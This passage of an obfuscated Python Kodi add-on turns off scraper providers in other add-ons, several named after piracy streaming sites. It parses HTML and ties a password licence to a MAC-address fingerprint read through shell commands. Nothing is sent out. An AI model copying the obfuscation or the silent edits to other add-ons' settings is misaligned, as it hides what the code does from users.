		OO00OO0O00OOOO0OO .setSetting ('wse','false')#line:1220
		OO00OO0O00OOOO0OO .setSetting ('wss','false')#line:1221
		OO00OO0O00OOOO0OO .setSetting ('wsse','false')#line:1222
		OO00OO0O00OOOO0OO =xbmcaddon .Addon ('plugin.video.speedmax')#line:1223
		OO00OO0O00OOOO0OO .setSetting ('debrid.only','true')#line:1224
		OO00OO0O00OOOO0OO .setSetting ('hosts.captcha','false')#line:1225
		OO00OO0O00OOOO0OO =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1226
		OO00OO0O00OOOO0OO .setSetting ('provider.123moviehd','false')#line:1227
		OO00OO0O00OOOO0OO .setSetting ('provider.300mbdownload','false')#line:1228
		OO00OO0O00OOOO0OO .setSetting ('provider.alltube','false')#line:1229
		OO00OO0O00OOOO0OO .setSetting ('provider.allucde','false')#line:1230
		OO00OO0O00OOOO0OO .setSetting ('provider.animebase','false')#line:1231
		OO00OO0O00OOOO0OO .setSetting ('provider.animeloads','false')#line:1232
		OO00OO0O00OOOO0OO .setSetting ('provider.animetoon','false')#line:1233
		OO00OO0O00OOOO0OO .setSetting ('provider.bnwmovies','false')#line:1234
		OO00OO0O00OOOO0OO .setSetting ('provider.boxfilm','false')#line:1235
		OO00OO0O00OOOO0OO .setSetting ('provider.bs','false')#line:1236
		OO00OO0O00OOOO0OO .setSetting ('provider.cartoonhd','false')#line:1237
		OO00OO0O00OOOO0OO .setSetting ('provider.cdahd','false')#line:1238
		OO00OO0O00OOOO0OO .setSetting ('provider.cdax','false')#line:1239
		OO00OO0O00OOOO0OO .setSetting ('provider.cine','false')#line:1240
		OO00OO0O00OOOO0OO .setSetting ('provider.cinenator','false')#line:1241
		OO00OO0O00OOOO0OO .setSetting ('provider.cmovieshdbz','false')#line:1242
		OO00OO0O00OOOO0OO .setSetting ('provider.coolmoviezone','false')#line:1243
		OO00OO0O00OOOO0OO .setSetting ('provider.ddl','false')#line:1244
		OO00OO0O00OOOO0OO .setSetting ('provider.deepmovie','false')#line:1245
		OO00OO0O00OOOO0OO .setSetting ('provider.ekinomaniak','false')#line:1246
		OO00OO0O00OOOO0OO .setSetting ('provider.ekinotv','false')#line:1247
		OO00OO0O00OOOO0OO .setSetting ('provider.filiser','false')#line:1248
		OO00OO0O00OOOO0OO .setSetting ('provider.filmpalast','false')#line:1249
		OO00OO0O00OOOO0OO .setSetting ('provider.filmwebbooster','false')#line:1250
		OO00OO0O00OOOO0OO .setSetting ('provider.filmxy','false')#line:1251
		OO00OO0O00OOOO0OO .setSetting ('provider.fmovies','false')#line:1252
		OO00OO0O00OOOO0OO .setSetting ('provider.foxx','false')#line:1253
		OO00OO0O00OOOO0OO .setSetting ('provider.freefmovies','false')#line:1254
		OO00OO0O00OOOO0OO .setSetting ('provider.freeputlocker','false')#line:1255
		OO00OO0O00OOOO0OO .setSetting ('provider.furk','false')#line:1256
		OO00OO0O00OOOO0OO .setSetting ('provider.gamatotv','false')#line:1257
		OO00OO0O00OOOO0OO .setSetting ('provider.gogoanime','false')#line:1258
		OO00OO0O00OOOO0OO .setSetting ('provider.gowatchseries','false')#line:1259
		OO00OO0O00OOOO0OO .setSetting ('provider.hackimdb','false')#line:1260
		OO00OO0O00OOOO0OO .setSetting ('provider.hdfilme','false')#line:1261
		OO00OO0O00OOOO0OO .setSetting ('provider.hdmto','false')#line:1262
		OO00OO0O00OOOO0OO .setSetting ('provider.hdpopcorns','false')#line:1263
		OO00OO0O00OOOO0OO .setSetting ('provider.hdstreams','false')#line:1264
		OO00OO0O00OOOO0OO .setSetting ('provider.horrorkino','false')#line:1266
		OO00OO0O00OOOO0OO .setSetting ('provider.iitv','false')#line:1267
		OO00OO0O00OOOO0OO .setSetting ('provider.iload','false')#line:1268
		OO00OO0O00OOOO0OO .setSetting ('provider.iwaatch','false')#line:1269
		OO00OO0O00OOOO0OO .setSetting ('provider.kinodogs','false')#line:1270
		OO00OO0O00OOOO0OO .setSetting ('provider.kinoking','false')#line:1271
		OO00OO0O00OOOO0OO .setSetting ('provider.kinow','false')#line:1272
		OO00OO0O00OOOO0OO .setSetting ('provider.kinox','false')#line:1273
		OO00OO0O00OOOO0OO .setSetting ('provider.lichtspielhaus','false')#line:1274
		OO00OO0O00OOOO0OO .setSetting ('provider.liomenoi','false')#line:1275
		OO00OO0O00OOOO0OO .setSetting ('provider.magnetdl','false')#line:1278
		OO00OO0O00OOOO0OO .setSetting ('provider.megapelistv','false')#line:1279
		OO00OO0O00OOOO0OO .setSetting ('provider.movie2k-ac','false')#line:1280
		OO00OO0O00OOOO0OO .setSetting ('provider.movie2k-ag','false')#line:1281
		OO00OO0O00OOOO0OO .setSetting ('provider.movie2z','false')#line:1282
		OO00OO0O00OOOO0OO .setSetting ('provider.movie4k','false')#line:1283
		OO00OO0O00OOOO0OO .setSetting ('provider.movie4kis','false')#line:1284
		OO00OO0O00OOOO0OO .setSetting ('provider.movieneo','false')#line:1285
		OO00OO0O00OOOO0OO .setSetting ('provider.moviesever','false')#line:1286
		OO00OO0O00OOOO0OO .setSetting ('provider.movietown','false')#line:1287
		OO00OO0O00OOOO0OO .setSetting ('provider.mvrls','false')#line:1289
		OO00OO0O00OOOO0OO .setSetting ('provider.netzkino','false')#line:1290
		OO00OO0O00OOOO0OO .setSetting ('provider.odb','false')#line:1291
		OO00OO0O00OOOO0OO .setSetting ('provider.openkatalog','false')#line:1292
		OO00OO0O00OOOO0OO .setSetting ('provider.ororo','false')#line:1293
		OO00OO0O00OOOO0OO .setSetting ('provider.paczamy','false')#line:1294
		OO00OO0O00OOOO0OO .setSetting ('provider.peliculasdk','false')#line:1295
		OO00OO0O00OOOO0OO .setSetting ('provider.pelisplustv','false')#line:1296
		OO00OO0O00OOOO0OO .setSetting ('provider.pepecine','false')#line:1297
		OO00OO0O00OOOO0OO .setSetting ('provider.primewire','false')#line:1298
		OO00OO0O00OOOO0OO .setSetting ('provider.projectfreetv','false')#line:1299
		OO00OO0O00OOOO0OO .setSetting ('provider.proxer','false')#line:1300
		OO00OO0O00OOOO0OO .setSetting ('provider.pureanime','false')#line:1301
		OO00OO0O00OOOO0OO .setSetting ('provider.putlocker','false')#line:1302
		OO00OO0O00OOOO0OO .setSetting ('provider.putlockerfree','false')#line:1303
		OO00OO0O00OOOO0OO .setSetting ('provider.reddit','false')#line:1304
		OO00OO0O00OOOO0OO .setSetting ('provider.cartoonwire','false')#line:1305
		OO00OO0O00OOOO0OO .setSetting ('provider.seehd','false')#line:1306
		OO00OO0O00OOOO0OO .setSetting ('provider.segos','false')#line:1307
		OO00OO0O00OOOO0OO .setSetting ('provider.serienstream','false')#line:1308
		OO00OO0O00OOOO0OO .setSetting ('provider.series9','false')#line:1309
		OO00OO0O00OOOO0OO .setSetting ('provider.seriesever','false')#line:1310
		OO00OO0O00OOOO0OO .setSetting ('provider.seriesonline','false')#line:1311
		OO00OO0O00OOOO0OO .setSetting ('provider.seriespapaya','false')#line:1312
		OO00OO0O00OOOO0OO .setSetting ('provider.sezonlukdizi','false')#line:1313
		OO00OO0O00OOOO0OO .setSetting ('provider.solarmovie','false')#line:1314
		OO00OO0O00OOOO0OO .setSetting ('provider.solarmoviez','false')#line:1315
		OO00OO0O00OOOO0OO .setSetting ('provider.stream-to','false')#line:1316
		OO00OO0O00OOOO0OO .setSetting ('provider.streamdream','false')#line:1317
		OO00OO0O00OOOO0OO .setSetting ('provider.streamflix','false')#line:1318
		OO00OO0O00OOOO0OO .setSetting ('provider.streamit','false')#line:1319
		OO00OO0O00OOOO0OO .setSetting ('provider.swatchseries','false')#line:1320
		OO00OO0O00OOOO0OO .setSetting ('provider.szukajkatv','false')#line:1321
		OO00OO0O00OOOO0OO .setSetting ('provider.tainiesonline','false')#line:1322
		OO00OO0O00OOOO0OO .setSetting ('provider.tainiomania','false')#line:1323
		OO00OO0O00OOOO0OO .setSetting ('provider.tata','false')#line:1326
		OO00OO0O00OOOO0OO .setSetting ('provider.trt','false')#line:1327
		OO00OO0O00OOOO0OO .setSetting ('provider.tvbox','false')#line:1328
		OO00OO0O00OOOO0OO .setSetting ('provider.ultrahd','false')#line:1329
		OO00OO0O00OOOO0OO .setSetting ('provider.video4k','false')#line:1330
		OO00OO0O00OOOO0OO .setSetting ('provider.vidics','false')#line:1331
		OO00OO0O00OOOO0OO .setSetting ('provider.view4u','false')#line:1332
		OO00OO0O00OOOO0OO .setSetting ('provider.watchseries','false')#line:1333
		OO00OO0O00OOOO0OO .setSetting ('provider.xrysoi','false')#line:1334
		OO00OO0O00OOOO0OO .setSetting ('provider.library','false')#line:1335
def fixfont ():#line:1338
	OOOOO0O0000O0OO0O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1339
	O00O0O00OOO00O00O =json .loads (OOOOO0O0000O0OO0O );#line:1341
	OO000000OOO0O0000 =O00O0O00OOO00O00O ["result"]["settings"]#line:1342
	OO0O00000OO00000O =[O0OOO0OO00O000000 for O0OOO0OO00O000000 in OO000000OOO0O0000 if O0OOO0OO00O000000 ["id"]=="audiooutput.audiodevice"][0 ]#line:1344
	OO00O0OO00O000O00 =OO0O00000OO00000O ["options"];#line:1345
	O00O0O000OOO00OO0 =OO0O00000OO00000O ["value"];#line:1346
	O00O0O0OO00O00000 =[O00OO00OO0O0O00OO for (O00OO00OO0O0O00OO ,OO00OOOO0000OO00O )in enumerate (OO00O0OO00O000O00 )if OO00OOOO0000OO00O ["value"]==O00O0O000OOO00OO0 ][0 ];#line:1348
	OOO0000O000O0O0OO =(O00O0O0OO00O00000 +1 )%len (OO00O0OO00O000O00 )#line:1350
	O0O0OO0OO0O0O0OOO =OO00O0OO00O000O00 [OOO0000O000O0O0OO ]["value"]#line:1352
	O00O0O00O000OO00O =OO00O0OO00O000O00 [OOO0000O000O0O0OO ]["label"]#line:1353
	O0O000OOO000OOOO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1355
	try :#line:1357
		OOO0OOOO00OOO0O00 =json .loads (O0O000OOO000OOOO0 );#line:1358
		if OOO0OOOO00OOO0O00 ["result"]!=True :#line:1360
			raise Exception #line:1361
	except :#line:1362
		sys .stderr .write ("Error switching audio output device")#line:1363
		raise Exception #line:1364
def parseDOM2 (OO000000O00O0OO0O ,name =u"",attrs ={},ret =False ):#line:1365
	if isinstance (OO000000O00O0OO0O ,str ):#line:1368
		try :#line:1369
			OO000000O00O0OO0O =[OO000000O00O0OO0O .decode ("utf-8")]#line:1370
		except :#line:1371
			OO000000O00O0OO0O =[OO000000O00O0OO0O ]#line:1372
	elif isinstance (OO000000O00O0OO0O ,unicode ):#line:1373
		OO000000O00O0OO0O =[OO000000O00O0OO0O ]#line:1374
	elif not isinstance (OO000000O00O0OO0O ,list ):#line:1375
		return u""#line:1376
	if not name .strip ():#line:1378
		return u""#line:1379
	OO0O00000O0O0000O =[]#line:1381
	for OO0O0O0OO00O0OOO0 in OO000000O00O0OO0O :#line:1382
		OOO000OOO0OO00O00 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OO0O0O0OO00O0OOO0 )#line:1383
		for OO000O00OOOO0O0O0 in OOO000OOO0OO00O00 :#line:1384
			OO0O0O0OO00O0OOO0 =OO0O0O0OO00O0OOO0 .replace (OO000O00OOOO0O0O0 ,OO000O00OOOO0O0O0 .replace ("\n"," "))#line:1385
		O0OOOO00O000OO0OO =[]#line:1387
		for O00O00OOOOOOO0000 in attrs :#line:1388
			O0OO0000O00O00OO0 =re .compile ('(<'+name +'[^>]*?(?:'+O00O00OOOOOOO0000 +'=[\'"]'+attrs [O00O00OOOOOOO0000 ]+'[\'"].*?>))',re .M |re .S ).findall (OO0O0O0OO00O0OOO0 )#line:1389
			if len (O0OO0000O00O00OO0 )==0 and attrs [O00O00OOOOOOO0000 ].find (" ")==-1 :#line:1390
				O0OO0000O00O00OO0 =re .compile ('(<'+name +'[^>]*?(?:'+O00O00OOOOOOO0000 +'='+attrs [O00O00OOOOOOO0000 ]+'.*?>))',re .M |re .S ).findall (OO0O0O0OO00O0OOO0 )#line:1391
			if len (O0OOOO00O000OO0OO )==0 :#line:1393
				O0OOOO00O000OO0OO =O0OO0000O00O00OO0 #line:1394
				O0OO0000O00O00OO0 =[]#line:1395
			else :#line:1396
				O00O000O00O00OOO0 =range (len (O0OOOO00O000OO0OO ))#line:1397
				O00O000O00O00OOO0 .reverse ()#line:1398
				for OOOOOOO00000O00OO in O00O000O00O00OOO0 :#line:1399
					if not O0OOOO00O000OO0OO [OOOOOOO00000O00OO ]in O0OO0000O00O00OO0 :#line:1400
						del (O0OOOO00O000OO0OO [OOOOOOO00000O00OO ])#line:1401
		if len (O0OOOO00O000OO0OO )==0 and attrs =={}:#line:1403
			O0OOOO00O000OO0OO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OO0O0O0OO00O0OOO0 )#line:1404
			if len (O0OOOO00O000OO0OO )==0 :#line:1405
				O0OOOO00O000OO0OO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OO0O0O0OO00O0OOO0 )#line:1406
		if isinstance (ret ,str ):#line:1408
			O0OO0000O00O00OO0 =[]#line:1409
			for OO000O00OOOO0O0O0 in O0OOOO00O000OO0OO :#line:1410
				O000O0OOOO0000OOO =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO000O00OOOO0O0O0 )#line:1411
				if len (O000O0OOOO0000OOO )==0 :#line:1412
					O000O0OOOO0000OOO =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO000O00OOOO0O0O0 )#line:1413
				for OO0O0OO0O000OOO0O in O000O0OOOO0000OOO :#line:1414
					O00000000O0O00O0O =OO0O0OO0O000OOO0O [0 ]#line:1415
					if O00000000O0O00O0O in "'\"":#line:1416
						if OO0O0OO0O000OOO0O .find ('='+O00000000O0O00O0O ,OO0O0OO0O000OOO0O .find (O00000000O0O00O0O ,1 ))>-1 :#line:1417
							OO0O0OO0O000OOO0O =OO0O0OO0O000OOO0O [:OO0O0OO0O000OOO0O .find ('='+O00000000O0O00O0O ,OO0O0OO0O000OOO0O .find (O00000000O0O00O0O ,1 ))]#line:1418
						if OO0O0OO0O000OOO0O .rfind (O00000000O0O00O0O ,1 )>-1 :#line:1420
							OO0O0OO0O000OOO0O =OO0O0OO0O000OOO0O [1 :OO0O0OO0O000OOO0O .rfind (O00000000O0O00O0O )]#line:1421
					else :#line:1422
						if OO0O0OO0O000OOO0O .find (" ")>0 :#line:1423
							OO0O0OO0O000OOO0O =OO0O0OO0O000OOO0O [:OO0O0OO0O000OOO0O .find (" ")]#line:1424
						elif OO0O0OO0O000OOO0O .find ("/")>0 :#line:1425
							OO0O0OO0O000OOO0O =OO0O0OO0O000OOO0O [:OO0O0OO0O000OOO0O .find ("/")]#line:1426
						elif OO0O0OO0O000OOO0O .find (">")>0 :#line:1427
							OO0O0OO0O000OOO0O =OO0O0OO0O000OOO0O [:OO0O0OO0O000OOO0O .find (">")]#line:1428
					O0OO0000O00O00OO0 .append (OO0O0OO0O000OOO0O .strip ())#line:1430
			O0OOOO00O000OO0OO =O0OO0000O00O00OO0 #line:1431
		else :#line:1432
			O0OO0000O00O00OO0 =[]#line:1433
			for OO000O00OOOO0O0O0 in O0OOOO00O000OO0OO :#line:1434
				OOO00O0OOOOOOO0OO =u"</"+name #line:1435
				OOO00000OOO00O0O0 =OO0O0O0OO00O0OOO0 .find (OO000O00OOOO0O0O0 )#line:1437
				O0O0000O000O0000O =OO0O0O0OO00O0OOO0 .find (OOO00O0OOOOOOO0OO ,OOO00000OOO00O0O0 )#line:1438
				OOO00000OOO0OOO0O =OO0O0O0OO00O0OOO0 .find ("<"+name ,OOO00000OOO00O0O0 +1 )#line:1439
				while OOO00000OOO0OOO0O <O0O0000O000O0000O and OOO00000OOO0OOO0O !=-1 :#line:1441
					O0OO0O00O0OO0O000 =OO0O0O0OO00O0OOO0 .find (OOO00O0OOOOOOO0OO ,O0O0000O000O0000O +len (OOO00O0OOOOOOO0OO ))#line:1442
					if O0OO0O00O0OO0O000 !=-1 :#line:1443
						O0O0000O000O0000O =O0OO0O00O0OO0O000 #line:1444
					OOO00000OOO0OOO0O =OO0O0O0OO00O0OOO0 .find ("<"+name ,OOO00000OOO0OOO0O +1 )#line:1445
				if OOO00000OOO00O0O0 ==-1 and O0O0000O000O0000O ==-1 :#line:1447
					OO0O0OO00OO000O0O =u""#line:1448
				elif OOO00000OOO00O0O0 >-1 and O0O0000O000O0000O >-1 :#line:1449
					OO0O0OO00OO000O0O =OO0O0O0OO00O0OOO0 [OOO00000OOO00O0O0 +len (OO000O00OOOO0O0O0 ):O0O0000O000O0000O ]#line:1450
				elif O0O0000O000O0000O >-1 :#line:1451
					OO0O0OO00OO000O0O =OO0O0O0OO00O0OOO0 [:O0O0000O000O0000O ]#line:1452
				elif OOO00000OOO00O0O0 >-1 :#line:1453
					OO0O0OO00OO000O0O =OO0O0O0OO00O0OOO0 [OOO00000OOO00O0O0 +len (OO000O00OOOO0O0O0 ):]#line:1454
				if ret :#line:1456
					OOO00O0OOOOOOO0OO =OO0O0O0OO00O0OOO0 [O0O0000O000O0000O :OO0O0O0OO00O0OOO0 .find (">",OO0O0O0OO00O0OOO0 .find (OOO00O0OOOOOOO0OO ))+1 ]#line:1457
					OO0O0OO00OO000O0O =OO000O00OOOO0O0O0 +OO0O0OO00OO000O0O +OOO00O0OOOOOOO0OO #line:1458
				OO0O0O0OO00O0OOO0 =OO0O0O0OO00O0OOO0 [OO0O0O0OO00O0OOO0 .find (OO0O0OO00OO000O0O ,OO0O0O0OO00O0OOO0 .find (OO000O00OOOO0O0O0 ))+len (OO0O0OO00OO000O0O ):]#line:1460
				O0OO0000O00O00OO0 .append (OO0O0OO00OO000O0O )#line:1461
			O0OOOO00O000OO0OO =O0OO0000O00O00OO0 #line:1462
		OO0O00000O0O0000O +=O0OOOO00O000OO0OO #line:1463
	return OO0O00000O0O0000O #line:1465
def addItem (O0OO0OOO00O0O00O0 ,O0000000O0OOO0000 ,O00O0OOO0O0OO000O ,O0O00OO00O0O00O00 ,O0O00O00OO0O0OO00 ,description =None ):#line:1467
	if description ==None :description =''#line:1468
	description ='[COLOR white]'+description +'[/COLOR]'#line:1469
	O00000O0OOO0O0O0O =sys .argv [0 ]+"?url="+urllib .quote_plus (O0000000O0OOO0000 )+"&mode="+str (O00O0OOO0O0OO000O )+"&name="+urllib .quote_plus (O0OO0OOO00O0O00O0 )+"&iconimage="+urllib .quote_plus (O0O00OO00O0O00O00 )+"&fanart="+urllib .quote_plus (O0O00O00OO0O0OO00 )#line:1470
	O00000OO0OO00OOO0 =True #line:1471
	O000OO0000O0O000O =xbmcgui .ListItem (O0OO0OOO00O0O00O0 ,iconImage =O0O00OO00O0O00O00 ,thumbnailImage =O0O00OO00O0O00O00 )#line:1472
	O000OO0000O0O000O .setInfo (type ="Video",infoLabels ={"Title":O0OO0OOO00O0O00O0 ,"Plot":description })#line:1473
	O000OO0000O0O000O .setProperty ("fanart_Image",O0O00O00OO0O0OO00 )#line:1474
	O000OO0000O0O000O .setProperty ("icon_Image",O0O00OO00O0O00O00 )#line:1475
	O00000OO0OO00OOO0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O00000O0OOO0O0O0O ,listitem =O000OO0000O0O000O ,isFolder =False )#line:1476
	return O00000OO0OO00OOO0 #line:1477
def get_params ():#line:1479
		O00OOO00OOO0OOOO0 =[]#line:1480
		OO00OOOOOOO00OO00 =sys .argv [2 ]#line:1481
		if len (OO00OOOOOOO00OO00 )>=2 :#line:1482
				O0000O0OOOOOOO0O0 =sys .argv [2 ]#line:1483
				O0000OOO000O000OO =O0000O0OOOOOOO0O0 .replace ('?','')#line:1484
				if (O0000O0OOOOOOO0O0 [len (O0000O0OOOOOOO0O0 )-1 ]=='/'):#line:1485
						O0000O0OOOOOOO0O0 =O0000O0OOOOOOO0O0 [0 :len (O0000O0OOOOOOO0O0 )-2 ]#line:1486
				OOOOOOO0O00O0O000 =O0000OOO000O000OO .split ('&')#line:1487
				O00OOO00OOO0OOOO0 ={}#line:1488
				for O00OOO0O0OO00000O in range (len (OOOOOOO0O00O0O000 )):#line:1489
						OO0OO0OOOO0OOO0O0 ={}#line:1490
						OO0OO0OOOO0OOO0O0 =OOOOOOO0O00O0O000 [O00OOO0O0OO00000O ].split ('=')#line:1491
						if (len (OO0OO0OOOO0OOO0O0 ))==2 :#line:1492
								O00OOO00OOO0OOOO0 [OO0OO0OOOO0OOO0O0 [0 ]]=OO0OO0OOOO0OOO0O0 [1 ]#line:1493
		return O00OOO00OOO0OOOO0 #line:1495
def decode (O00O00OO0O00OOOOO ,O0OO00OO0O000O00O ):#line:1500
    import base64 #line:1501
    O0OOOO0O0O0000O0O =[]#line:1502
    if (len (O00O00OO0O00OOOOO ))!=4 :#line:1504
     return 10 #line:1505
    O0OO00OO0O000O00O =base64 .urlsafe_b64decode (O0OO00OO0O000O00O )#line:1506
    for O0O0O0O0OO0OOO00O in range (len (O0OO00OO0O000O00O )):#line:1508
        O000OOOOOOOOOO00O =O00O00OO0O00OOOOO [O0O0O0O0OO0OOO00O %len (O00O00OO0O00OOOOO )]#line:1509
        OOOO0000000O0OO0O =chr ((256 +ord (O0OO00OO0O000O00O [O0O0O0O0OO0OOO00O ])-ord (O000OOOOOOOOOO00O ))%256 )#line:1510
        O0OOOO0O0O0000O0O .append (OOOO0000000O0OO0O )#line:1511
    return "".join (O0OOOO0O0O0000O0O )#line:1512
def tmdb_list (O00OO0O000OO0O000 ):#line:1513
    O0000OO00O00O0O00 =decode ("7643",O00OO0O000OO0O000 )#line:1516
    return int (O0000OO00O00O0O00 )#line:1519
def u_list (OOO00000OO0000O0O ):#line:1520
    from math import sqrt #line:1522
    OOOO00OO0O0O00O0O =tmdb_list (TMDB_NEW_API )#line:1523
    OOO0OOO0OOOOOO00O =str ((getHwAddr ('eth0'))*OOOO00OO0O0O00O0O )#line:1525
    OO0O0OOOOO00O0O0O =int (OOO0OOO0OOOOOO00O [1 ]+OOO0OOO0OOOOOO00O [2 ]+OOO0OOO0OOOOOO00O [5 ]+OOO0OOO0OOOOOO00O [7 ])#line:1526
    O0OO00O000OO0OO00 =(ADDON .getSetting ("pass"))#line:1528
    OOOOOOO0000OOO00O =(str (round (sqrt ((OO0O0OOOOO00O0O0O *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1533
    if '.'in OOOOOOO0000OOO00O :#line:1534
     OOOOOOO0000OOO00O =(str (round (sqrt ((OO0O0OOOOO00O0O0O *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1535
    logging .warning (OOOOOOO0000OOO00O )#line:1536
    if O0OO00O000OO0OO00 ==OOOOOOO0000OOO00O :#line:1537
      OO00O00O0OO0OOO00 =OOO00000OO0000O0O #line:1539
    else :#line:1541
       if STARTP2 ()and STARTP ()=='ok':#line:1542
         return OOO00000OO0000O0O #line:1545
       OO00O00O0OO0OOO00 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1546
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1547
       sys .exit ()#line:1548
    return OO00O00O0OO0OOO00 #line:1549
def disply_hwr ():#line:1551
   O00OO0O00OO00O0O0 =tmdb_list (TMDB_NEW_API )#line:1552
   OOOO00000O00O000O =str ((getHwAddr ('eth0'))*O00OO0O00OO00O0O0 )#line:1553
   OOO000000000O0OO0 =(OOOO00000O00O000O [1 ]+OOOO00000O00O000O [2 ]+OOOO00000O00O000O [5 ]+OOOO00000O00O000O [7 ])#line:1560
   O00O000O00000OOO0 =(ADDON .getSetting ("action"))#line:1561
   wiz .setS ('action',str (OOO000000000O0OO0 ))#line:1563
def disply_hwr2 ():#line:1564
   OO0OO00O0O000O0OO =tmdb_list (TMDB_NEW_API )#line:1565
   O0O000000OO0O000O =str ((getHwAddr ('eth0'))*OO0OO00O0O000O0OO )#line:1566
   OOOOO000OOOOO0000 =(O0O000000OO0O000O [1 ]+O0O000000OO0O000O [2 ]+O0O000000OO0O000O [5 ]+O0O000000OO0O000O [7 ])#line:1573
   O0OO000O000O0000O =(ADDON .getSetting ("action"))#line:1574
   xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOOOO000OOOOO0000 )#line:1577
def getHwAddr (O00O00OO000OOO000 ):#line:1579
   import subprocess ,time #line:1580
   OO0O00O00000O0O00 ='windows'#line:1581
   if xbmc .getCondVisibility ('system.platform.android'):#line:1582
       OO0O00O00000O0O00 ='android'#line:1583
   if (OO0O00O00000O0O00 =='android'):#line:1584
     OOOO0O0O00OO0OOO0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1585
     O0O0OOOOOO0O0OOO0 =re .compile ('link/ether (.+?) brd').findall (str (OOOO0O0O00OO0OOO0 ))#line:1587
     OOO000O0O000O0OOO =0 #line:1588
     for OOO0O00OOOOO0OOOO in O0O0OOOOOO0O0OOO0 :#line:1589
      if O0O0OOOOOO0O0OOO0 !='00:00:00:00:00:00':#line:1590
          OOO00OO000OO000O0 =OOO0O00OOOOO0OOOO #line:1591
          OOO000O0O000O0OOO =OOO000O0O000O0OOO +int (OOO00OO000OO000O0 .replace (':',''),16 )#line:1592
   else :#line:1594
       O0O0OO00O0O0O0O00 =0 #line:1595
       OOO000O0O000O0OOO =0 #line:1596
       OO00OO0O0OOO0O000 =[]#line:1597
       OOOOOO0O0OO000000 =os .popen ("getmac").read ()#line:1598
       OOOOOO0O0OO000000 =OOOOOO0O0OO000000 .split ("\n")#line:1599
       for O00OO0000OO0OOO00 in OOOOOO0O0OO000000 :#line:1601
            OO00OO0OO0OO0OO0O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O00OO0000OO0OOO00 ,re .I )#line:1602
            if OO00OO0OO0OO0OO0O :#line:1603
                O0O0OOOOOO0O0OOO0 =OO00OO0OO0OO0OO0O .group ().replace ('-',':')#line:1604
                OO00OO0O0OOO0O000 .append (O0O0OOOOOO0O0OOO0 )#line:1605
                OOO000O0O000O0OOO =OOO000O0O000O0OOO +int (O0O0OOOOOO0O0OOO0 .replace (':',''),16 )#line:1608
       '''
       while(1):
         mac_address = xbmc.getInfoLabel("network.macaddress")
         logging.warning(mac_address)
         if mac_address!="Busy" and  mac_address!=' עסוק':
    
            break
         else:
           x=x+1
           time.sleep(1)
           if x>30:
            break
       '''#line:1622
   return OOO000O0O000O0OOO #line:1624
def getpass ():#line:1625
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.mediacenter/default.py?mode=9&url=clearCache)")#line:1627
def setpass ():#line:1628
    O00O0O0O000O0OO00 =xbmcgui .Dialog ()#line:1629
    OOO0O0OO00O00O0OO =O00O0O0O000O0OO00 .numeric (0 ,'הכנס סיסמה')#line:1631
    wiz .setS ('pass',str (OOO0O0OO00O00O0OO ))#line:1636
def setuname ():#line:1637
    O0OOOO0O0O00OO000 =''#line:1638
    OO0OO0000O00OOOO0 =xbmc .Keyboard (O0OOOO0O0O00OO000 ,'הכנס שם משתמש')#line:1639
    OO0OO0000O00OOOO0 .doModal ()#line:1640
    if OO0OO0000O00OOOO0 .isConfirmed ():#line:1641
           O0OOOO0O0O00OO000 =OO0OO0000O00OOOO0 .getText ()#line:1642
           wiz .setS ('user',str (O0OOOO0O0O00OO000 ))#line:1643
def powerkodi ():#line:1644
    os ._exit (1 )#line:1645
def buffer1 ():#line:1647
	O0O00OOOO000OOO00 =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1648
	OOOOOOO00O00O0O0O =xbmc .getInfoLabel ("System.Memory(total)")#line:1649
	OO00O000OO000OOOO =xbmc .getInfoLabel ("System.FreeMemory")#line:1650
	O0OOO0O0O0O0000OO =re .sub ('[^0-9]','',OO00O000OO000OOOO )#line:1651
	O0OOO0O0O0O0000OO =int (O0OOO0O0O0O0000OO )/3 #line:1652
	OO0O000O000OO0OOO =O0OOO0O0O0O0000OO *1024 *1024 #line:1653
	try :O0O0O00OOO0000000 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1654
	except :O0O0O00OOO0000000 =16 #line:1655
	O000OOO00OO0O0OO0 =DIALOG .yesno ('FREE MEMORY: '+str (OO00O000OO000OOOO ),'Based on your free Memory your optimal buffersize is: '+str (O0OOO0O0O0O0000OO )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1658
	if O000OOO00OO0O0OO0 ==1 :#line:1659
		with open (O0O00OOOO000OOO00 ,"w")as O000O0O0O00OO0000 :#line:1660
			if O0O0O00OOO0000000 >=17 :OO00O0O0000OO00O0 =xml_data_advSettings_New (str (OO0O000O000OO0OOO ))#line:1661
			else :OO00O0O0000OO00O0 =xml_data_advSettings_old (str (OO0O000O000OO0OOO ))#line:1662
			O000O0O0O00OO0000 .write (OO00O0O0000OO00O0 )#line:1664
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O000O000OO0OOO ),'Please restart Kodi for settings to apply.','')#line:1665
	elif O000OOO00OO0O0OO0 ==0 :#line:1667
		OO0O000O000OO0OOO =_OO0O0O0O000OO0OOO (default =str (OO0O000O000OO0OOO ),heading ="INPUT BUFFER SIZE")#line:1668
		with open (O0O00OOOO000OOO00 ,"w")as O000O0O0O00OO0000 :#line:1669
